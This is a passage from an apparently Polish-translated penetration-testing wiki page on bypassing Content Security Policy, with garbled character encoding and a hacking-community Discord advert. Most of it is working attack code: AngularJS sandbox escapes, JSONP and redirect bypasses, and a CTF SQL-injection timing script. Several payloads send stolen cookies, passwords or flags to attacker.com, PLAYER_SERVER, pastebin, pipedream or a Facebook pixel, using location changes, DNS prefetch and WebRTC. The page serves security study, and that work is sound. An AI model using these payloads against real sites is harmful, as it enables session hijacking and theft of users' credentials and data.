1. Wybierz zakÅ‚adkÄ™ "Testowe zdarzenia", aby zobaczyÄ‡ zdarzenia wysyÅ‚ane przez "twojÄ…" stronÄ™ internetowÄ….

NastÄ™pnie, po stronie ofiary, wykonaj poniÅ¼szy kod, aby zainicjowaÄ‡ piksel Å›ledzenia Facebooka, ktÃ³ry bÄ™dzie wskazywaÅ‚ na aplikacjÄ™ dewelopera atakujÄ…cego o podanym ID i wywoÅ‚aÅ‚ zdarzenie niestandardowe w ten sposÃ³b:
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
Co do pozostaÅ‚ych siedmiu domen stron trzecich wymienionych w poprzedniej tabeli, istnieje wiele innych sposobÃ³w, w jakie moÅ¼na je naduÅ¼yÄ‡. Zapoznaj siÄ™ z wczeÅ›niejszym [postem na blogu](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) dla dodatkowych wyjaÅ›nieÅ„ na temat innych naduÅ¼yÄ‡ stron trzecich.

### OminiÄ™cie za pomocÄ… RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

OprÃ³cz wspomnianego wczeÅ›niej przekierowania w celu ominiÄ™cia ograniczeÅ„ Å›cieÅ¼ki, istnieje jeszcze inna technika nazywana Relative Path Overwrite (RPO), ktÃ³ra moÅ¼e byÄ‡ stosowana na niektÃ³rych serwerach.

Na przykÅ‚ad, jeÅ›li CSP zezwala na Å›cieÅ¼kÄ™ `https://example.com/scripts/react/`, moÅ¼na jÄ… ominiÄ…Ä‡ w nastÄ™pujÄ…cy sposÃ³b:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
PrzeglÄ…darka ostatecznie zaÅ‚aduje `https://example.com/scripts/angular/angular.js`.

To dziaÅ‚a, poniewaÅ¼ dla przeglÄ…darki Å‚adowany jest plik o nazwie `..%2fangular%2fangular.js` znajdujÄ…cy siÄ™ w `https://example.com/scripts/react/`, co jest zgodne z CSP.

NastÄ™pnie przeglÄ…darka zdekoduje to, efektywnie Å¼Ä…dajÄ…c `https://example.com/scripts/react/../angular/angular.js`, co jest rÃ³wnowaÅ¼ne z `https://example.com/scripts/angular/angular.js`.

**WykorzystujÄ…c tÄ™ niekonsekwencjÄ™ w interpretacji adresu URL miÄ™dzy przeglÄ…darkÄ… a serwerem, moÅ¼na ominÄ…Ä‡ reguÅ‚y Å›cieÅ¼ki**.

RozwiÄ…zaniem jest nie traktowanie `%2f` jako `/` po stronie serwera, zapewniajÄ…c spÃ³jnÄ… interpretacjÄ™ miÄ™dzy przeglÄ…darkÄ… a serwerem w celu unikniÄ™cia tego problemu.

PrzykÅ‚ad online: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Wykonywanie skryptÃ³w JS w ramkach (iframes)

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### BrakujÄ…ca dyrektywa **base-uri**

JeÅ›li brakuje dyrektywy **base-uri**, moÅ¼na jej naduÅ¼yÄ‡ do wykonania [**wstrzykniÄ™cia zawieszonego znacznika**](../dangling-markup-html-scriptless-injection/).

Ponadto, jeÅ›li **strona Å‚adowana jest skryptem za pomocÄ… Å›cieÅ¼ki wzglÄ™dnej** (np. `<script src="/js/app.js">`) przy uÅ¼yciu **Nonce**, moÅ¼na wykorzystaÄ‡ **tag base** do **zaÅ‚adowania** skryptu z **wÅ‚asnego serwera, osiÄ…gajÄ…c XSS**.\
JeÅ›li podatna strona jest Å‚adowana z **httpS**, uÅ¼yj adresu URL httpS w tagu base.
```html
<base href="https://www.attacker.com/">
```
### Zdarzenia AngularJS

OkreÅ›lona polityka znana jako Content Security Policy (CSP) moÅ¼e ograniczaÄ‡ zdarzenia JavaScript. Niemniej jednak, AngularJS wprowadza niestandardowe zdarzenia jako alternatywÄ™. W ramach zdarzenia AngularJS udostÄ™pnia unikalny obiekt `$event`, odnoszÄ…cy siÄ™ do natywnego obiektu zdarzenia przeglÄ…darki. Ten obiekt `$event` moÅ¼e byÄ‡ wykorzystany do obejÅ›cia CSP. Warto zauwaÅ¼yÄ‡, Å¼e w Chrome obiekt `$event/event` posiada atrybut `path`, przechowujÄ…cy tablicÄ™ obiektÃ³w zwiÄ…zanych z Å‚aÅ„cuchem wykonania zdarzenia, przy czym obiekt `window` jest zawsze umieszczony na koÅ„cu. Ta struktura jest kluczowa dla taktyk ucieczki z piaskownicy.

Poprzez skierowanie tej tablicy do filtru `orderBy`, moÅ¼liwe jest iterowanie po niej, wykorzystujÄ…c koÅ„cowy element (obiekt `window`), aby wywoÅ‚aÄ‡ globalnÄ… funkcjÄ™, takÄ… jak `alert()`. Przedstawiony poniÅ¼ej fragment kodu wyjaÅ›nia ten proces:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ten fragment kodu przedstawia uÅ¼ycie dyrektywy `ng-focus` do wywoÅ‚ania zdarzenia, wykorzystanie `$event.path|orderBy` do manipulacji tablicÄ… `path` oraz wykorzystanie obiektu `window` do wykonania funkcji `alert()`, co pozwala ujawniÄ‡ `document.cookie`.

**ZnajdÅº inne sposoby obejÅ›cia Angulara na** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS i domeny na biaÅ‚ej liÅ›cie
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Polityka CSP, ktÃ³ra umoÅ¼liwia Å‚adowanie skryptÃ³w z biaÅ‚ej listy domen w aplikacji Angular JS, moÅ¼e zostaÄ‡ obejÅ›niÄ™ta poprzez wywoÅ‚anie funkcji zwrotnych i pewnych podatnych klas. WiÄ™cej informacji na temat tej techniki moÅ¼na znaleÅºÄ‡ w szczegÃ³Å‚owym przewodniku dostÄ™pnym w tym [repozytorium git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).


DziaÅ‚ajÄ…ce Å‚adunki:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Inne punkty koÅ„cowe do dowolnego wykonania JSONP moÅ¼na znaleÅºÄ‡ [**tutaj**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (niektÃ³re z nich zostaÅ‚y usuniÄ™te lub naprawione)

### OminiÄ™cie za pomocÄ… przekierowania

Co siÄ™ dzieje, gdy CSP napotyka przekierowanie po stronie serwera? JeÅ›li przekierowanie prowadzi do innej domeny, ktÃ³ra nie jest dozwolona, to i tak siÄ™ nie powiedzie.

Jednak, zgodnie z opisem w [specyfikacji CSP 4.2.2.3. ÅšcieÅ¼ki i przekierowania](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), jeÅ›li przekierowanie prowadzi do innej Å›cieÅ¼ki, moÅ¼na ominiÄ…Ä‡ pierwotne ograniczenia.

Oto przykÅ‚ad:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
JeÅ›li CSP jest ustawione na `https://www.google.com/a/b/c/d`, to ze wzglÄ™du na uwzglÄ™dnienie Å›cieÅ¼ki, zarÃ³wno skrypty `/test`, jak i `/a/test` zostanÄ… zablokowane przez CSP.

JednakÅ¼e, koÅ„cowa lokalizacja `http://localhost:5555/301` zostanie **przekierowana po stronie serwera na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. PoniewaÅ¼ jest to przekierowanie, **Å›cieÅ¼ka nie jest brana pod uwagÄ™**, a **skrypt moÅ¼e byÄ‡ zaÅ‚adowany**, co umoÅ¼liwia obejÅ›cie ograniczenia Å›cieÅ¼ki.

DziÄ™ki temu przekierowaniu, nawet jeÅ›li Å›cieÅ¼ka jest podana w caÅ‚oÅ›ci, nadal zostanie obejÅ›niÄ™ta.

Najlepszym rozwiÄ…zaniem jest wiÄ™c upewnienie siÄ™, Å¼e strona internetowa nie posiada podatnoÅ›ci na otwarte przekierowania i Å¼e nie ma domen, ktÃ³re mogÄ… byÄ‡ wykorzystane w reguÅ‚ach CSP.

### OminiÄ™cie CSP za pomocÄ… zwisajÄ…cego znacznika

Przeczytaj [jak tutaj](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; za pomocÄ… XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` oznacza, Å¼e moÅ¼na wykonaÄ‡ dowolny skrypt w kodzie (XSS moÅ¼e wykonaÄ‡ kod), a `img-src *` oznacza, Å¼e moÅ¼na uÅ¼ywaÄ‡ na stronie internetowej dowolnego obrazu z dowolnego ÅºrÃ³dÅ‚a.

MoÅ¼na ominÄ…Ä‡ tÄ™ politykÄ™ CSP, eksfiltrujÄ…c dane za pomocÄ… obrazÃ³w (w tym przypadku XSS wykorzystuje CSRF, gdzie strona dostÄ™pna przez bota zawiera SQLi i wydobywa flagÄ™ za pomocÄ… obrazu):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Z: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

MoÅ¼na rÃ³wnieÅ¼ wykorzystaÄ‡ tÄ™ konfiguracjÄ™ do **wczytania kodu JavaScript umieszczonego wewnÄ…trz obrazu**. JeÅ›li na przykÅ‚ad strona pozwala na wczytywanie obrazÃ³w z Twittera, moÅ¼na **stworzyÄ‡** **specjalny obraz**, **przesÅ‚aÄ‡** go na Twittera i wykorzystaÄ‡ "**unsafe-inline**" do **wykonania** kodu JS (jak w przypadku zwykÅ‚ego XSS), ktÃ³ry **wczyta** obraz, **wydobÄ™dzie** z niego kod **JS** i go **wykona**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Z wykorzystaniem Service Workers

Funkcja **`importScripts`** w Service Workers nie jest ograniczona przez CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Wstrzykiwanie polityki

**Badania:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

JeÅ›li **parametr** wysÅ‚any przez Ciebie jest **wklejany wewnÄ…trz** **deklaracji** **polityki**, moÅ¼esz **zmieniÄ‡** politykÄ™ w taki sposÃ³b, Å¼e staje siÄ™ **bezuÅ¼yteczna**. MoÅ¼esz **zezwoliÄ‡ na skrypt 'unsafe-inline'** za pomocÄ… jednego z tych bypassÃ³w:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
PoniewaÅ¼ ta dyrektywa **nadpisze istniejÄ…ce dyrektywy script-src**.\
PrzykÅ‚ad moÅ¼na znaleÅºÄ‡ tutaj: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

W przypadku przeglÄ…darki Edge jest znacznie prostsze. JeÅ›li moÅ¼esz dodaÄ‡ do CSP tylko to: **`;_`**, **Edge** caÅ‚kowicie **ignoruje** caÅ‚Ä… **politykÄ™**.\
PrzykÅ‚ad: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; za pomocÄ… XSS (iframe) - Atak czasowy

ZauwaÅ¼ brak dyrektywy `'unsafe-inline'`.\
Tym razem moÅ¼esz sprawiÄ‡, Å¼e ofiara **zaÅ‚aduje** stronÄ™ **pod twojÄ… kontrolÄ…** za pomocÄ… **XSS** i `<iframe>`. Tym razem sprawisz, Å¼e ofiara uzyska dostÄ™p do strony, z ktÃ³rej chcesz wydobyÄ‡ informacje (**CSRF**). Nie moÅ¼esz uzyskaÄ‡ dostÄ™pu do zawartoÅ›ci strony, ale jeÅ›li w jakiÅ› sposÃ³b moÅ¼esz **kontrolowaÄ‡ czas potrzebny na zaÅ‚adowanie** strony, moÅ¼esz wydobyÄ‡ potrzebne informacje.

Tym razem zostanie wydobyta **flaga**, za kaÅ¼dym razem gdy **poprawnie zgadniesz znak** za pomocÄ… SQLi, **odpowiedÅº** zajmie **wiÄ™cej czasu** ze wzglÄ™du na funkcjÄ™ sleep. NastÄ™pnie bÄ™dziesz mÃ³gÅ‚ wydobyÄ‡ flagÄ™:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Za pomocÄ… BookmarkletÃ³w

Ten atak wymaga pewnego inÅ¼ynierii spoÅ‚ecznej, gdzie atakujÄ…cy **przekonuje uÅ¼ytkownika, aby przeciÄ…gnÄ…Å‚ i upuÅ›ciÅ‚ link na zakÅ‚adkÄ™ przeglÄ…darki**. Ta zakÅ‚adka zawiera **zÅ‚oÅ›liwy kod JavaScript**, ktÃ³ry po przeciÄ…gniÄ™ciu lub klikniÄ™ciu zostanie wykonany w kontekÅ›cie bieÅ¼Ä…cego okna przeglÄ…darki, **omijajÄ…c CSP i umoÅ¼liwiajÄ…c kradzieÅ¼ wraÅ¼liwych informacji**, takich jak ciasteczka lub tokeny.

Aby uzyskaÄ‡ wiÄ™cej informacji, [**sprawdÅº oryginalne zgÅ‚oszenie tutaj**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### OminiÄ™cie CSP poprzez ograniczenie CSP

W [**tym raporcie z CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP jest omijane poprzez wstrzykniÄ™cie bardziej restrykcyjnego CSP do dozwolonego iframe, ktÃ³ry zabrania Å‚adowania okreÅ›lonego pliku JS, a nastÄ™pnie za pomocÄ… **zanieczyszczania prototypu** lub **nadpisywania DOM** umoÅ¼liwia wykorzystanie innego skryptu do Å‚adowania dowolnego skryptu.

MoÅ¼esz **ograniczyÄ‡ CSP dla iframe** za pomocÄ… atrybutu **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

W [**tym opisie CTF**](https://github.com/aszx87410/ctf-writeups/issues/48) byÅ‚o moÅ¼liwe poprzez **wstrzykniÄ™cie HTML** bardziej **ograniczyÄ‡** CSP, dziÄ™ki czemu skrypt zapobiegajÄ…cy CSTI zostaÅ‚ wyÅ‚Ä…czony i tym samym **podatnoÅ›Ä‡ staÅ‚a siÄ™ wykorzystywalna.**\
CSP moÅ¼na bardziej ograniczyÄ‡ za pomocÄ… **metatagÃ³w HTML** i wyÅ‚Ä…czyÄ‡ skrypty inline **usuwanie** **wpisu** umoÅ¼liwiajÄ…cego ich **nonce** oraz **wÅ‚Ä…czanie konkretnego skryptu inline za pomocÄ… sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Wykradanie danych JS za pomocÄ… Content-Security-Policy-Report-Only

JeÅ›li uda ci siÄ™ sprawiÄ‡, Å¼e serwer odpowie nagÅ‚Ã³wkiem **`Content-Security-Policy-Report-Only`** z **wartoÅ›ciÄ… kontrolowanÄ… przez ciebie** (moÅ¼e to byÄ‡ spowodowane przez CRLF), moÅ¼esz sprawiÄ‡, Å¼e bÄ™dzie on wskazywaÅ‚ na twÃ³j serwer, a jeÅ›li **opakujesz** zawartoÅ›Ä‡ JS, ktÃ³rÄ… chcesz wykraÅ›Ä‡ w znacznik **`<script>`**, a poniewaÅ¼ prawdopodobnie `unsafe-inline` nie jest dozwolone przez CSP, spowoduje to **bÅ‚Ä…d CSP**, a czÄ™Å›Ä‡ skryptu (zawierajÄ…ca wraÅ¼liwe informacje) zostanie wysÅ‚ana na serwer z `Content-Security-Policy-Report-Only`.

PrzykÅ‚ad takiego ataku znajdziesz w [**tym opisie CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Wyciek informacji za pomocÄ… CSP i Iframe

- Tworzony jest `iframe`, ktÃ³ry wskazuje na URL (nazwijmy go `https://example.redirect.com`), ktÃ³ry jest dozwolony przez CSP.
- NastÄ™pnie ten URL przekierowuje do tajnego URL (np. `https://usersecret.example2.com`), ktÃ³ry **nie jest dozwolony** przez CSP.
- NasÅ‚uchujÄ…c zdarzenia `securitypolicyviolation`, moÅ¼na przechwyciÄ‡ wÅ‚aÅ›ciwoÅ›Ä‡ `blockedURI`. Ta wÅ‚aÅ›ciwoÅ›Ä‡ ujawnia domenÄ™ zablokowanego URI, ujawniajÄ…c tajnÄ… domenÄ™, do ktÃ³rej przekierowano poczÄ…tkowy URL.

Warto zauwaÅ¼yÄ‡, Å¼e przeglÄ…darki takie jak Chrome i Firefox majÄ… rÃ³Å¼ne zachowania w obsÅ‚udze iframe'Ã³w w kontekÅ›cie CSP, co prowadzi do potencjalnego wycieku poufnych informacji z powodu niezdefiniowanego zachowania.

InnÄ… technikÄ… jest wykorzystanie samego CSP do wydedukowania tajnej subdomeny. Ta metoda polega na wykorzystaniu algorytmu wyszukiwania binarnego i dostosowaniu CSP, aby zawieraÅ‚ okreÅ›lone domeny, ktÃ³re sÄ… celowo blokowane. Na przykÅ‚ad, jeÅ›li tajna subdomena skÅ‚ada siÄ™ z nieznanych znakÃ³w, moÅ¼na iteracyjnie testowaÄ‡ rÃ³Å¼ne subdomeny, modyfikujÄ…c dyrektywÄ™ CSP, aby blokowaÄ‡ lub zezwalaÄ‡ na te subdomeny. Oto fragment kodu pokazujÄ…cy, jak moÅ¼e byÄ‡ skonfigurowane CSP w celu uÅ‚atwienia tej metody:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
MonitorujÄ…c, ktÃ³re Å¼Ä…dania sÄ… blokowane lub zezwolone przez CSP, moÅ¼na zawÄ™ziÄ‡ moÅ¼liwe znaki w tajnym subdomenie, ostatecznie odkrywajÄ…c peÅ‚ny adres URL.

Obie metody wykorzystujÄ… subtelnoÅ›ci implementacji i zachowania CSP w przeglÄ…darkach, pokazujÄ…c, jak pozornie bezpieczne polityki mogÄ… nieumyÅ›lnie ujawniaÄ‡ wraÅ¼liwe informacje.

Sztuczka z [**tutaj**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo o hakerstwie**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## Niebezpieczne technologie do obejÅ›cia CSP

### PrzeÅ‚adowanie bufora odpowiedzi PHP

PHP jest znany z **buforowania odpowiedzi do 4096** bajtÃ³w domyÅ›lnie. Dlatego, jeÅ›li PHP wyÅ›wietla ostrzeÅ¼enie, dostarczajÄ…c **wystarczajÄ…cÄ… iloÅ›Ä‡ danych w ostrzeÅ¼eniach**, **odpowiedÅº** zostanie **wysÅ‚ana przed** **nagÅ‚Ã³wkiem CSP**, co spowoduje zignorowanie nagÅ‚Ã³wka.\
NastÄ™pnie technika polega gÅ‚Ã³wnie na **wypeÅ‚nieniu bufora odpowiedzi ostrzeÅ¼eniami**, aby nagÅ‚Ã³wek CSP nie zostaÅ‚ wysÅ‚any.

PomysÅ‚ z [**tego opisu**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Przepisanie strony bÅ‚Ä™du

Z [**tego opisu**](https://blog.ssrf.kr/69) wynika, Å¼e moÅ¼liwe byÅ‚o obejÅ›cie ochrony CSP poprzez zaÅ‚adowanie strony bÅ‚Ä™du (potencjalnie bez CSP) i przepisanie jej zawartoÅ›ci.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME to technika, ktÃ³ra wykorzystuje XSS (lub bardzo ograniczony XSS) **w punkcie koÅ„cowym strony**, aby **wykorzystaÄ‡** **inne punkty koÅ„cowe tej samej domeny**. Polega to na zaÅ‚adowaniu podatnego punktu koÅ„cowego z atakujÄ…cej strony, a nastÄ™pnie odÅ›wieÅ¼eniu atakujÄ…cej strony do prawdziwego punktu koÅ„cowego w tej samej domenie, ktÃ³ry chcemy wykorzystaÄ‡. W ten sposÃ³b **podatny punkt koÅ„cowy** moÅ¼e uÅ¼yÄ‡ obiektu **`opener`** w **payloadzie**, aby **uzyskaÄ‡ dostÄ™p do DOM** prawdziwego punktu koÅ„cowego do wykorzystania. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Ponadto, **wordpress** ma punkt koÅ„cowy **JSONP** w `/wp-json/wp/v2/users/1?_jsonp=data`, ktÃ³ry **odzwierciedla** przesÅ‚ane dane w wyniku (z ograniczeniem tylko do liter, cyfr i kropek).

AtakujÄ…cy moÅ¼e wykorzystaÄ‡ ten punkt koÅ„cowy do **wygenerowania ataku SOME** na WordPress i **osadzenia** go wewnÄ…trz `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`. NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e ten **skrypt** zostanie **zaÅ‚adowany**, poniewaÅ¼ jest **dozwolony przez 'self'**. Ponadto, ze wzglÄ™du na zainstalowany WordPress, atakujÄ…cy moÅ¼e wykorzystaÄ‡ **atak SOME** poprzez **podatny punkt koÅ„cowy wywoÅ‚ania zwrotnego**, ktÃ³ry **omija CSP**, aby nadaÄ‡ wiÄ™ksze uprawnienia uÅ¼ytkownikowi, zainstalowaÄ‡ nowÄ… wtyczkÄ™...
Aby uzyskaÄ‡ wiÄ™cej informacji na temat wykonania tego ataku, sprawdÅº [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypassowanie CSP w celu wycieku danych

JeÅ›li istnieje surowa CSP, ktÃ³ra nie pozwala na **interakcjÄ™ z zewnÄ™trznymi serwerami**, istnieje kilka rzeczy, ktÃ³re zawsze moÅ¼na zrobiÄ‡, aby wyciec informacje.

### Location

MoÅ¼esz po prostu zaktualizowaÄ‡ lokalizacjÄ™, aby przesÅ‚aÄ‡ tajne informacje na serwer atakujÄ…cego:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

MoÅ¼esz przekierowaÄ‡, wstrzykujÄ…c meta tag (to jest tylko przekierowanie, nie ujawni to treÅ›ci)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### Prefetch DNS

Aby szybciej Å‚adowaÄ‡ strony, przeglÄ…darki bÄ™dÄ… wstÄ™pnie rozwiÄ…zywaÄ‡ nazwy hostÃ³w na adresy IP i przechowywaÄ‡ je w pamiÄ™ci podrÄ™cznej do pÃ³Åºniejszego uÅ¼ycia.\
MoÅ¼esz wskazaÄ‡ przeglÄ…darce, aby wstÄ™pnie rozwiÄ…zaÅ‚a nazwÄ™ hosta za pomocÄ…: `<link reol="dns-prefetch" href="something.com">`

MoÅ¼esz wykorzystaÄ‡ to zachowanie do **wyciekania wraÅ¼liwych informacji za pomocÄ… Å¼Ä…daÅ„ DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Inny sposÃ³b:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Aby temu zapobiec, serwer moÅ¼e wysÅ‚aÄ‡ nagÅ‚Ã³wek HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
WyglÄ…da na to, Å¼e ta technika nie dziaÅ‚a w przeglÄ…darkach bez interfejsu (botach).
{% endhint %}

### WebRTC

Na kilku stronach moÅ¼na przeczytaÄ‡, Å¼e **WebRTC nie sprawdza polityki `connect-src`** CSP.

W rzeczywistoÅ›ci moÅ¼na _wyciekaÄ‡_ informacje za pomocÄ… _Å¼Ä…dania DNS_. SprawdÅº ten kod:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Inny sposÃ³b:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Sprawdzanie polityk CSP online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatyczne tworzenie CSP

